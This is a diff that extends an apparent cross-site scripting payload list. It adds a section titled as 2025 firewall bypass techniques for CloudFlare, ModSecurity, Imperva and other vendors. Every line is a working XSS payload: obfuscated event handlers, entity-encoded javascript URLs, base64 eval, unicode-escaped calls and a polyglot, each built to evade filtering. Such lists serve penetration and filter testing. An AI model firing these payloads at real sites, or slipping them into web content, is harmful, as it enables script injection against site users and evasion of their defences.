@@ -149,3 +149,30 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 <img src=x onerror=self['\u{0061}\u{006C}\u{0065}\u{0072}\u{0074}'](1)>
 <img src=x onerror=top['\u{0061}\u{006C}\u{0065}\u{0072}\u{0074}'](1)>
 <img src=x onerror=parent['\u{0061}\u{006C}\u{0065}\u{0072}\u{0074}'](1)>
+
+# Advanced WAF Bypass Techniques - 2025 Edition
+# CloudFlare/ModSecurity/Imperva/Akamai/F5/Barracuda/AWS/Fortinet
+<svg/onload=prompt(1)>
+<svg onload=alert&#40;1&#41>
+<a href="j&#97;v&#97;script&#x3A;&#97;lert(1)">Click</a>
+<svg/onload=self[`aler`%2b`t`]`1`>
+<svg/onload=self['alert'](1)>
+<img src=x onerror=window['ale'+'rt'](1)>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<script>throw onerror=alert,1337</script>
+<script>with(top)alert(1)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<form><button formaction=javascript:alert(1)>click</button></form>
+<video><source onerror=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<script>promise=Promise.reject();promise.then(x=>{},alert);</script>
+<script>import('data:text/javascript,alert(1)')</script>
+<img src=x onerror=Function("a"+"l"+"e"+"r"+"t(1)")()>
+<img src=x onerror=(()=>{a\u{006C}ert(1)})()>
+<img src=x onerror=setTimeout('ale'+'rt(1)')>
+<img src=x onerror=this['alert'](1)>
+
+# Polyglot
+<svg><g/onload=alert(1)//<p>
+
+# More advanced payloads in custom_payloads/waf-advanced-bypass.txt
